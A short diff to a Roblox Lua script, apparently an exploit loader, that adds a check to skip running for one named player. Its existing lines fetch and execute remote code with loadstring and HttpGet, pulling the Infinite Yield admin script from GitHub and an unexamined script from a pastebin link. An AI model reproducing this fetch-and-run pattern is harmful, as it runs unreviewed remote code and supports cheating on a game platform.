@@ -1,3 +1,6 @@
+if game.Players.LocalPlayer.Name == "lhhi65" then
+  return
+end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))();
 loadstring(game:HttpGet("https://pastebin.com/raw/PqBt2KtX"))(); -- no buggy graphics
 
